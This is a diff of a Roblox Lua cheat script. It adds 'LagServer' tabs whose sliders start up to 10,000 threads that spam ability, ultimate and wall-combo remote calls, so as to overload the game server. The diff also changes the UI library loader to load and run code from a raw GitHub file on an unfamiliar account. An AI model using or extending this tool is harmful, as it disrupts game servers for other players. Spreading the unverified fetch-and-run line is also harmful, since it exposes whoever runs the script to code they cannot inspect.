@@ -1,7 +1,7 @@
 --brutal
 
 -- Rayfield UI Library
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/amarhitranjanbiruly/kk/refs/heads/main/rimod.lua'))()
 
 -- Services
 local Players = game:GetService("Players")
@@ -36,8 +36,6 @@ local AbilitySpamLoop
 local MobRemote = ReplicatedStorage.Remotes.Character.ChangeCharacter
 local IgnoreFriends = true
 local AntiLagEnabled = true
-
--- NEW: Auto Mob switch toggle (default ON)
 local AutoMobEnabled = true
 
 local function GetCurrentCharacter()
@@ -68,9 +66,8 @@ local function FindNearestPlayer()
     return nearest
 end
 
--- MODIFIED: EnsureMob now checks AutoMobEnabled flag
 local function EnsureMob()
-    if not AutoMobEnabled then return end   -- skip if user turned it off
+    if not AutoMobEnabled then return end
     if GetCurrentCharacter() ~= "Mob" then
         MobRemote:FireServer("Mob")
         task.wait(0.1)
@@ -142,7 +139,6 @@ Tab:CreateToggle({
     end
 })
 
--- NEW: Toggle to control auto-switch to Mob
 Tab:CreateToggle({
     Name = "Auto Switch to Mob (On by default)",
     CurrentValue = true,
@@ -159,18 +155,14 @@ Tab:CreateToggle({
     Callback = function(Value)
         AbilitySpamEnabled = Value
         if Value then
-            EnsureMob()  -- will only switch if AutoMobEnabled is true
+            EnsureMob()
             AbilitySpamLoop = task.spawn(function()
                 local abilityIndices = { "1", "2", "3", "4" }
                 while AbilitySpamEnabled do
                     for _, idx in ipairs(abilityIndices) do
                         if not AbilitySpamEnabled then break end
                         UseAbility(idx)
-                        if AntiLagEnabled then
-                            task.wait(0.05)
-                        else
-                            task.wait(0)
-                        end
+                        if AntiLagEnabled then task.wait(0.05) else task.wait(0) end
                         if AbilitySpamEnabled then
                             local c = GetCurrentCharacter()
                             pcall(function()
@@ -180,9 +172,7 @@ Tab:CreateToggle({
                                 end
                             end)
                         end
-                        if AntiLagEnabled then
-                            task.wait(0.05)
-                        end
+                        if AntiLagEnabled then task.wait(0.05) end
                     end
                 end
             end)
@@ -249,18 +239,14 @@ Tab:CreateToggle({
     Callback = function(Value)
         UltimateSpamEnabled = Value
         if Value then
-            EnsureMob()  -- will only switch if AutoMobEnabled is true
+            EnsureMob()
             UltimateSpamLoop = task.spawn(function()
                 local ultimateIndices = { "1", "2", "3", "4" }
                 while UltimateSpamEnabled do
                     for _, idx in ipairs(ultimateIndices) do
                         if not UltimateSpamEnabled then break end
                         UseUltimate(idx)
-                        if AntiLagEnabled then
-                            task.wait(0.05)
-                        else
-                            task.wait(0)
-                        end
+                        if AntiLagEnabled then task.wait(0.05) else task.wait(0) end
                         if UltimateSpamEnabled then
                             local c = GetCurrentCharacter()
                             pcall(function()
@@ -270,9 +256,7 @@ Tab:CreateToggle({
                                 end
                             end)
                         end
-                        if AntiLagEnabled then
-                            task.wait(0.05)
-                        end
+                        if AntiLagEnabled then task.wait(0.05) end
                     end
                 end
             end)
@@ -484,6 +468,33 @@ SpeedTab:CreateSlider({
 -- ==================== LAGSERVER TAB – 50 INDEPENDENT SPAMMERS (ABILITIES) ====================
 local LagServerTab = Window:CreateTab("LagServer", 4483362458)
 
+-- Slider for extra ability spammers (master controlled)
+local abilitySpammerCount = 50
+LagServerTab:CreateSlider({
+    Name = "Number of Extra Ability Spammers",
+    Range = {1, 10000},
+    Increment = 1,
+    CurrentValue = 50,
+    Flag = "AbilitySpammerCount",
+    Callback = function(Value)
+        abilitySpammerCount = Value
+    end
+})
+
+-- NEW: Slider for start delay (seconds)
+local abilityStartDelay = 0.45
+LagServerTab:CreateSlider({
+    Name = "Start Delay (seconds)",
+    Range = {0.01, 2},
+    Increment = 0.01,
+    CurrentValue = 0.45,
+    Flag = "AbilityStartDelay",
+    Callback = function(Value)
+        abilityStartDelay = Value
+    end
+})
+
+-- 50 manual toggles (unchanged)
 local SpammerEnabled = {}
 local SpammerThreads = {}
 
@@ -493,11 +504,7 @@ local function SpammerLoop(index)
         for _, idx in ipairs(abilityIndices) do
             if not SpammerEnabled[index] then break end
             UseAbility(idx)
-            if AntiLagEnabled then
-                task.wait(0.05)
-            else
-                task.wait(0)
-            end
+            if AntiLagEnabled then task.wait(0.05) else task.wait(0) end
             if SpammerEnabled[index] then
                 local c = GetCurrentCharacter()
                 pcall(function()
@@ -507,9 +514,7 @@ local function SpammerLoop(index)
                     end
                 end)
             end
-            if AntiLagEnabled then
-                task.wait(0.05)
-            end
+            if AntiLagEnabled then task.wait(0.05) end
         end
     end
 end
@@ -520,54 +525,12 @@ local function StartSpammer(index)
         SpammerThreads[index] = nil
     end
     if SpammerEnabled[index] then
-        EnsureMob()  -- will only switch if AutoMobEnabled is true
+        EnsureMob()
         SpammerThreads[index] = task.spawn(SpammerLoop, index)
     end
 end
 
--- Master toggle for all 50 spammers
-local masterToggleValue = false
-local enableSequence = nil
-
-LagServerTab:CreateToggle({
-    Name = "Master Control (All 50 Spammers)",
-    CurrentValue = false,
-    Flag = "MasterSpammerToggle",
-    Callback = function(Value)
-        masterToggleValue = Value
-
-        if enableSequence then
-            task.cancel(enableSequence)
-            enableSequence = nil
-        end
-
-        if Value then
-            enableSequence = task.spawn(function()
-                for i = 1, 20 do
-                    if not masterToggleValue then break end
-                    SpammerEnabled[i] = true
-                    StartSpammer(i)
-                    pcall(function()
-                        Rayfield:SetToggle("SpammerToggle_" .. i, true)
-                    end)
-                    if i < 20 then task.wait(0.45) end
-                end
-                enableSequence = nil
-            end)
-        else
-            for i = 1, 20 do
-                SpammerEnabled[i] = false
-                StartSpammer(i)
-                pcall(function()
-                    Rayfield:SetToggle("SpammerToggle_" .. i, false)
-                end)
-            end
-        end
-    end
-})
-
--- Create 50 individual toggles
-for i = 1, 20 do
+for i = 1, 50 do
     LagServerTab:CreateToggle({
         Name = "Spammer #" .. i,
         CurrentValue = false,
@@ -579,8 +542,96 @@ for i = 1, 20 do
     })
 end
 
+-- Extra spammers (controlled by master, does NOT touch manual toggles)
+local extraAbilitySpamming = false
+local extraAbilityThreads = {}
+
+local function ExtraAbilitySpammer()
+    local abilityIndices = { "1", "2", "3", "4" }
+    while extraAbilitySpamming do
+        for _, idx in ipairs(abilityIndices) do
+            if not extraAbilitySpamming then break end
+            UseAbility(idx)
+            if AntiLagEnabled then task.wait(0.05) else task.wait(0) end
+            if extraAbilitySpamming then
+                local c = GetCurrentCharacter()
+                pcall(function()
+                    local ability = ReplicatedStorage.Characters[c].Abilities[idx]
+                    if ability then
+                        ReplicatedStorage.Remotes.Abilities.AbilityCanceled:FireServer(ability)
+                    end
+                end)
+            end
+            if AntiLagEnabled then task.wait(0.05) end
+        end
+    end
+end
+
+local masterToggleValue = false
+local enableSequence = nil
+
+LagServerTab:CreateToggle({
+    Name = "Master Control (Extra Ability Spammers)",
+    CurrentValue = false,
+    Flag = "MasterSpammerToggle",
+    Callback = function(Value)
+        masterToggleValue = Value
+
+        if enableSequence then
+            task.cancel(enableSequence)
+            enableSequence = nil
+        end
+
+        if Value then
+            EnsureMob()
+            extraAbilitySpamming = true
+            enableSequence = task.spawn(function()
+                for i = 1, abilitySpammerCount do
+                    if not masterToggleValue then break end
+                    local thread = task.spawn(ExtraAbilitySpammer)
+                    table.insert(extraAbilityThreads, thread)
+                    task.wait(abilityStartDelay)  -- use the slider value
+                end
+                enableSequence = nil
+            end)
+        else
+            extraAbilitySpamming = false
+            for _, thread in ipairs(extraAbilityThreads) do
+                task.cancel(thread)
+            end
+            extraAbilityThreads = {}
+        end
+    end
+})
+
 -- ==================== ULTIMATE LAGSERVER TAB – 50 INDEPENDENT ULTIMATE SPAMMERS ====================
 local UltimateLagServerTab = Window:CreateTab("UltimateLagServer", 4483362458)
+
+-- Slider for extra ultimate spammers
+local ultimateSpammerCount = 50
+UltimateLagServerTab:CreateSlider({
+    Name = "Number of Extra Ultimate Spammers",
+    Range = {1, 10000},
+    Increment = 1,
+    CurrentValue = 50,
+    Flag = "UltimateSpammerCount",
+    Callback = function(Value)
+        ultimateSpammerCount = Value
+    end
+})
+
+-- NEW: Slider for start delay (seconds)
+local ultimateStartDelay = 0.45
+UltimateLagServerTab:CreateSlider({
+    Name = "Start Delay (seconds)",
+    Range = {0.01, 2},
+    Increment = 0.01,
+    CurrentValue = 0.45,
+    Flag = "UltimateStartDelay",
+    Callback = function(Value)
+        ultimateStartDelay = Value
+    end
+})
 
 local UltimateSpammerEnabled = {}
 local UltimateSpammerThreads = {}
@@ -591,11 +642,7 @@ local function UltimateSpammerLoop(index)
         for _, idx in ipairs(ultimateIndices) do
             if not UltimateSpammerEnabled[index] then break end
             UseUltimate(idx)
-            if AntiLagEnabled then
-                task.wait(0.05)
-            else
-                task.wait(0)
-            end
+            if AntiLagEnabled then task.wait(0.05) else task.wait(0) end
             if UltimateSpammerEnabled[index] then
                 local c = GetCurrentCharacter()
                 pcall(function()
@@ -605,9 +652,7 @@ local function UltimateSpammerLoop(index)
                     end
                 end)
             end
-            if AntiLagEnabled then
-                task.wait(0.05)
-            end
+            if AntiLagEnabled then task.wait(0.05) end
         end
     end
 end
@@ -618,54 +663,12 @@ local function StartUltimateSpammer(index)
         UltimateSpammerThreads[index] = nil
     end
     if UltimateSpammerEnabled[index] then
-        EnsureMob()  -- will only switch if AutoMobEnabled is true
+        EnsureMob()
         UltimateSpammerThreads[index] = task.spawn(UltimateSpammerLoop, index)
     end
 end
 
--- Master toggle for all 50 ultimate spammers
-local ultimateMasterToggleValue = false
-local ultimateEnableSequence = nil
-
-UltimateLagServerTab:CreateToggle({
-    Name = "Master Control (All 50 Ultimate Spammers)",
-    CurrentValue = false,
-    Flag = "MasterUltimateSpammerToggle",
-    Callback = function(Value)
-        ultimateMasterToggleValue = Value
-
-        if ultimateEnableSequence then
-            task.cancel(ultimateEnableSequence)
-            ultimateEnableSequence = nil
-        end
-
-        if Value then
-            ultimateEnableSequence = task.spawn(function()
-                for i = 1, 20 do
-                    if not ultimateMasterToggleValue then break end
-                    UltimateSpammerEnabled[i] = true
-                    StartUltimateSpammer(i)
-                    pcall(function()
-                        Rayfield:SetToggle("UltimateSpammerToggle_" .. i, true)
-                    end)
-                    if i < 20 then task.wait(0.45) end
-                end
-                ultimateEnableSequence = nil
-            end)
-        else
-            for i = 1, 20 do
-                UltimateSpammerEnabled[i] = false
-                StartUltimateSpammer(i)
-                pcall(function()
-                    Rayfield:SetToggle("UltimateSpammerToggle_" .. i, false)
-                end)
-            end
-        end
-    end
-})
-
--- Create 50 individual toggles for ultimate spammers
-for i = 1, 20 do
+for i = 1, 50 do
     UltimateLagServerTab:CreateToggle({
         Name = "Ultimate Spammer #" .. i,
         CurrentValue = false,
@@ -677,8 +680,163 @@ for i = 1, 20 do
     })
 end
 
+-- Extra ultimate spammers (master controlled)
+local extraUltimateSpamming = false
+local extraUltimateThreads = {}
+
+local function ExtraUltimateSpammer()
+    local ultimateIndices = { "1", "2", "3", "4" }
+    while extraUltimateSpamming do
+        for _, idx in ipairs(ultimateIndices) do
+            if not extraUltimateSpamming then break end
+            UseUltimate(idx)
+            if AntiLagEnabled then task.wait(0.05) else task.wait(0) end
+            if extraUltimateSpamming then
+                local c = GetCurrentCharacter()
+                pcall(function()
+                    local ultimate = ReplicatedStorage.Characters[c].Ultimates[idx]
+                    if ultimate then
+                        ReplicatedStorage.Remotes.Abilities.AbilityCanceled:FireServer(ultimate)
+                    end
+                end)
+            end
+            if AntiLagEnabled then task.wait(0.05) end
+        end
+    end
+end
+
+local ultimateMasterToggleValue = false
+local ultimateEnableSequence = nil
+
+UltimateLagServerTab:CreateToggle({
+    Name = "Master Control (Extra Ultimate Spammers)",
+    CurrentValue = false,
+    Flag = "MasterUltimateSpammerToggle",
+    Callback = function(Value)
+        ultimateMasterToggleValue = Value
+
+        if ultimateEnableSequence then
+            task.cancel(ultimateEnableSequence)
+            ultimateEnableSequence = nil
+        end
+
+        if Value then
+            EnsureMob()
+            extraUltimateSpamming = true
+            ultimateEnableSequence = task.spawn(function()
+                for i = 1, ultimateSpammerCount do
+                    if not ultimateMasterToggleValue then break end
+                    local thread = task.spawn(ExtraUltimateSpammer)
+                    table.insert(extraUltimateThreads, thread)
+                    task.wait(ultimateStartDelay)  -- use the slider value
+                end
+                ultimateEnableSequence = nil
+            end)
+        else
+            extraUltimateSpamming = false
+            for _, thread in ipairs(extraUltimateThreads) do
+                task.cancel(thread)
+            end
+            extraUltimateThreads = {}
+        end
+    end
+})
+
+-- ==================== NEW: WALLCOMBO SPAMMER (EXTRA, MASTER CONTROLLED) ====================
+local WallComboSpamTab = Window:CreateTab("WallComboSpam", 4483362458)
+
+-- Slider for number of wall combo spammers
+local wallComboSpammerCount = 50
+WallComboSpamTab:CreateSlider({
+    Name = "Number of WallCombo Spammers",
+    Range = {1, 10000},
+    Increment = 1,
+    CurrentValue = 50,
+    Flag = "WallComboSpammerCount",
+    Callback = function(Value)
+        wallComboSpammerCount = Value
+    end
+})
+
+-- Slider for start delay (seconds)
+local wallComboStartDelay = 0.45
+WallComboSpamTab:CreateSlider({
+    Name = "Start Delay (seconds)",
+    Range = {0.01, 2},
+    Increment = 0.01,
+    CurrentValue = 0.45,
+    Flag = "WallComboStartDelay",
+    Callback = function(Value)
+        wallComboStartDelay = Value
+    end
+})
+
+-- Master toggle and threads
+local wallComboSpamEnabled = false
+local wallComboSpamThreads = {}
+local wallComboEnableSequence = nil
+
+-- The loop function for each thread
+local function WallComboSpammerLoop()
+    while wallComboSpamEnabled do
+        wallcomboMethod1()
+        -- Small wait to prevent overloading, you can adjust
+        task.wait(0.05)
+    end
+end
+
+WallComboSpamTab:CreateToggle({
+    Name = "Master Control (Extra WallCombo Spammers)",
+    CurrentValue = false,
+    Flag = "MasterWallComboSpammerToggle",
+    Callback = function(Value)
+        wallComboSpamEnabled = Value
+
+        if wallComboEnableSequence then
+            task.cancel(wallComboEnableSequence)
+            wallComboEnableSequence = nil
+        end
+
+        if Value then
+            -- No need to switch to Mob, WallCombo works with any character that has it
+            -- but you may optionally ensure mob? Not required.
+            wallComboSpamEnabled = true
+            wallComboEnableSequence = task.spawn(function()
+                for i = 1, wallComboSpammerCount do
+                    if not wallComboSpamEnabled then break end
+                    local thread = task.spawn(WallComboSpammerLoop)
+                    table.insert(wallComboSpamThreads, thread)
+                    task.wait(wallComboStartDelay)
+                end
+                wallComboEnableSequence = nil
+            end)
+        else
+            wallComboSpamEnabled = false
+            for _, thread in ipairs(wallComboSpamThreads) do
+                task.cancel(thread)
+            end
+            wallComboSpamThreads = {}
+        end
+    end
+})
+
+-- Optional: Add a keybind for the wall combo master toggle (e.g., W)
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.W then
+        local current = Rayfield:GetToggle("MasterWallComboSpammerToggle")
+        if current ~= nil then
+            Rayfield:SetToggle("MasterWallComboSpammerToggle", not current)
+            Rayfield:Notify({
+                Title = "Keybind",
+                Content = "Toggled extra WallCombo spammers " .. (not current and "ON" or "OFF"),
+                Duration = 2
+            })
+        end
+    end
+end)
+
 -- ==================== KEYBINDS ====================
--- Keybind to toggle all 50 ability spammers with 'L'
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     if input.KeyCode == Enum.KeyCode.L then
@@ -686,13 +844,12 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         Rayfield:SetToggle("MasterSpammerToggle", newValue)
         Rayfield:Notify({
             Title = "Keybind",
-            Content = "Toggled all 50 ability spammers " .. (newValue and "ON" or "OFF"),
+            Content = "Toggled extra ability spammers " .. (newValue and "ON" or "OFF"),
             Duration = 2
         })
     end
 end)
 
--- Keybind to toggle all 50 ultimate spammers with 'U'
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     if input.KeyCode == Enum.KeyCode.U then
@@ -700,7 +857,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         Rayfield:SetToggle("MasterUltimateSpammerToggle", newValue)
         Rayfield:Notify({
             Title = "Keybind",
-            Content = "Toggled all 50 ultimate spammers " .. (newValue and "ON" or "OFF"),
+            Content = "Toggled extra ultimate spammers " .. (newValue and "ON" or "OFF"),
             Duration = 2
         })
     end
@@ -709,7 +866,7 @@ end)
 -- ==================== NOTIFICATION ====================
 Rayfield:Notify({
     Title = "Script Ready",
-    Content = "All features loaded. Press L for ability spammers, U for ultimate spammers.",
+    Content = "All features loaded. Press L for extra ability spammers, U for extra ultimate spammers, W for extra WallCombo spammers.",
     Duration = 5
 })
 
